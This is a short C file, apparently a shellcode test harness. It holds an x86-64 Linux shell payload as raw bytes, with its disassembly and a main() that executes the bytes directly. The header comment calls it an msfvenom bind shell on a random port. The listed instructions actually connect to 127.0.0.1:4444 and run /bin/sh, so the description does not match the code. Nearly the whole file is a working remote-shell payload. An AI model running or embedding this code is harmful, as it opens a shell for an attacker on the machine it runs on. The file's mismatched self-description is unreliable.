/*
  This is the msfvnom shellcode for the payload linux/x64/shell_bind_tcp_random_port

  Generated with command:
        msfvenom -p linux/x64/shell_bind_tcp_random_port -f c
*/

/*
  ASM
0000000000004060 <code>:
    4060:	6a 29                	push   0x29
    4062:	58                   	pop    rax
    4063:	99                   	cdq    
    4064:	6a 02                	push   0x2
    4066:	5f                   	pop    rdi
    4067:	6a 01                	push   0x1
    4069:	5e                   	pop    rsi
    406a:	0f 05                	syscall 
    406c:	48 97                	xchg   rdi,rax
    406e:	48 b9 02 00 11 5c 7f 	movabs rcx,0x100007f5c110002
    4075:	00 00 01 
    4078:	51                   	push   rcx
    4079:	48 89 e6             	mov    rsi,rsp
    407c:	6a 10                	push   0x10
    407e:	5a                   	pop    rdx
    407f:	6a 2a                	push   0x2a
    4081:	58                   	pop    rax
    4082:	0f 05                	syscall 
    4084:	6a 03                	push   0x3
    4086:	5e                   	pop    rsi
    4087:	48 ff ce             	dec    rsi
    408a:	6a 21                	push   0x21
    408c:	58                   	pop    rax
    408d:	0f 05                	syscall 
    408f:	75 f6                	jne    4087 <code+0x27>
    4091:	6a 3b                	push   0x3b
    4093:	58                   	pop    rax
    4094:	99                   	cdq    
    4095:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f6e69622f
    409c:	73 68 00 
    409f:	53                   	push   rbx
    40a0:	48 89 e7             	mov    rdi,rsp
    40a3:	52                   	push   rdx
    40a4:	57                   	push   rdi
    40a5:	48 89 e6             	mov    rsi,rsp
    40a8:	0f 05                	syscall 
	...
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

void main()
{
	printf("ShellCode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
